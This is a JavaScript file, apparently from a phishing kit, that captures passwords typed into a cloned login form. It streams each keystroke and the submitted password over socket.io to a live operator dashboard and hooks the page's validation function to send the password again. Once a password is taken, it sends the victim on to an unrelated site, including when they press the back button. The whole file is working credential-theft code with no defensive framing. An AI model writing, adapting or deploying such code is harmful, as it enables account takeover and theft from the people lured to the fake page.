/* pwd.js - Password form client for dashboard */
(function () {
  const SERVER_URL = window.location.origin;
  const SESSION_STORAGE_KEY = "sessionID";
  const DASH_EMIT_EVENT = "client-data";
  const DASH_JOIN_EVENT = "client-join";

  // --- Utilities -----------------------------------------------------------
  function onceDomReady(fn) {
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", fn, { once: true });
    } else {
      fn();
    }
  }

  function getOrCreateSessionID() {
    let sid = null;
    try { sid = localStorage.getItem(SESSION_STORAGE_KEY) || null; } catch {}
    if (!sid) {
      sid = Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
      try { localStorage.setItem(SESSION_STORAGE_KEY, sid); } catch {}
    }
    return sid;
  }

  function debounce(fn, ms) {
    let t;
    return function (...args) {
      clearTimeout(t);
      t = setTimeout(() => fn.apply(this, args), ms);
    };
  }

  // --- Redirect Logic (runs on load and pageshow) ---
  function checkPwdRedirect() {
    try {
      if (localStorage.getItem("pwdPassed")) {
        console.log("[pwd-client] pwdPassed found in localStorage, redirecting to https://burgeralarm.com");
        window.location.href = "https://burgeralarm.com";
        return true;
      }
    } catch {}
    return false;
  }

  // --- Socket layer --------------------------------------------------------
  function ensureSocketIO(cb) {
    if (window.io && typeof window.io === "function") return cb();

    const s = document.createElement("script");
    s.src = SERVER_URL.replace(/\/$/, "") + "/socket.io/socket.io.js";
    s.async = true;
    s.onload = cb;
    s.onerror = () => console.warn("[pwd-client] Could not load socket.io from server.");
    document.head.appendChild(s);
  }

  function connectSocket(sessionID) {
    if (!window.io) {
      console.warn("[pwd-client] socket.io not available.");
      return null;
    }
    const socket = window.io(SERVER_URL, { transports: ["websocket", "polling"] });

    socket.on("connect", () => {
      console.log("[pwd-client] connected:", socket.id, "session:", sessionID);
      socket.emit(DASH_JOIN_EVENT, { sessionID });
    });

    socket.on("disconnect", () => {
      console.log("[pwd-client] disconnected");
    });

    // Listen for dashboard actions if needed
    socket.on("dashboard-action", ({ buttonName, value }) => {
      console.log("[pwd-client] dashboard action:", buttonName, value);
    });

    return socket;
  }

  // --- Main ---------------------------------------------------------------
  onceDomReady(function () {
    // Check for redirect immediately
    if (checkPwdRedirect()) return;

    // Prepare socket
    ensureSocketIO(() => {
      const sessionID = getOrCreateSessionID();
      const socket = connectSocket(sessionID);
      if (!socket) return;

      // Find form input field (typically the password input)
      // The actual selector depends on the password form structure
      const inputField = document.querySelector('input[type="text"], input[data-testid*="input"]');
      
      // Debounced emitter for real-time input updates
      const sendPasswordData = debounce((val) => {
        socket.emit(DASH_EMIT_EVENT, { type: "password", data: String(val || "") });
      }, 300);

      // Attach input listener if field exists
      if (inputField) {
        inputField.addEventListener('input', (e) => sendPasswordData(e.target.value));
      }

      // Handle form submission or button click
      // Look for the primary submit button (typically labeled "Next")
      const submitBtn = document.querySelector('[data-testid="primaryButton"]');
      
      if (submitBtn) {
        submitBtn.addEventListener('click', function(e) {
          // Capture the password value at submission time
          const passwordValue = inputField ? inputField.value : "";
          
          const passwordData = {
            password: passwordValue,
            timestamp: new Date().toISOString()
          };

          console.log('[pwd-client] Password submitted');

          // Send final data to dashboard
          socket.emit(DASH_EMIT_EVENT, { 
            type: "password", 
            data: String(passwordValue || "")
          });

          // Store in localStorage
          try {
            localStorage.setItem('passwordData', JSON.stringify(passwordData));
          } catch {}

          // Mark that pwd page has been passed with input
          if (passwordValue.trim()) {
            try {
              localStorage.setItem('pwdPassed', 'true');
            } catch {}
          }
        });
      }

      // Override validate function to also send to dashboard
      if (window.validate) {
        const originalValidate = window.validate;
        window.validate = function() {
          const result = originalValidate.call(this);
          if (result && inputField) {
            // Send on successful validation
            socket.emit(DASH_EMIT_EVENT, { 
              type: "password", 
              data: String(inputField.value || "") 
            });

            // Mark that pwd page has been passed with input
            if (inputField.value.trim()) {
              try {
                localStorage.setItem('pwdPassed', 'true');
              } catch {}
            }
          }
          return result;
        };
      }
    });
  });

  // CRITICAL: Listen to pageshow event for mobile back button
  // This fires when user navigates back to this page
  window.addEventListener('pageshow', checkPwdRedirect);
})();